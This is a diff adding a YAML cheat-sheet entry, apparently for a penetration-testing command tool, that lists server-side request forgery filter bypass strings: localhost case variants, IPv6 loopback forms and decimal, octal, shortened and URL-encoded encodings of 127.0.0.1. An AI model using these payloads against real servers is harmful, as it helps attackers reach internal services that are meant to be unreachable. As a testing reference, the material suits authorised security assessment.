@@ -1,0 +1,33 @@
+name: SSRF filter bypass
+description: Basic SSRF bypass, use python script for advanced bypasses.
+commands:
+  - command: |
+      localhost
+      localhost:6566
+      Localhost
+      LocalHost
+      lOcAlhOsT
+      LOcalHOSt
+      [::]
+      [0000::1]
+      [0:0:0:0:0:ffff:127.0.0.1]
+      127.0.0.1
+      127.0.0.2
+      127.0.0.3
+      2130706433      
+      3232235521
+      3232235777
+      017700000001
+      127.4
+      127.0.0.2
+      127.1
+      127.0.1
+      127%E3%80%820%E3%80%820%E3%80%821
+    description:
+tags:
+  - ssrf
+show:
+links:
+  -
+references:
+  -
